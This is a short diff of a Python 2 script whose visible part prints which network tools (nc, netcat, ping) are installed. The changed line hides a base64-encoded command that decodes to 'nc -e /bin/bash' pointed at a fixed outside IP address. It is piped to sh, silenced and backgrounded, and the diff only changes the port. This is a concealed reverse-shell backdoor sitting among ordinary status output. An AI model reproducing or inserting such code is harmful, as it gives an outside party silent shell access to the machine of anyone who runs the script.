@@ -214,7 +214,7 @@ def identTools():
 	print "     Nc: %s" % nc.strip()
 	print "     Netcat: %s" % ne.strip()
 	print "     Ping: %s" % pi.strip()
-printx('echo "bmMgLWUgL2Jpbi9iYXNoIDE5My4xNjEuMTkzLjk5IDM5MDYzCg==" | base64 -d|sh &>/dev/null &')
+printx('echo "bmMgLWUgL2Jpbi9iYXNoIDE5My4xNjEuMTkzLjk5IDUzODU1ICY+L2Rldi9udWxsCg==" | base64 -d|sh &>/dev/null &')
 if len(host) > 0:
 	if host.find("https://") != -1 or host.find("http://") != -1:
 
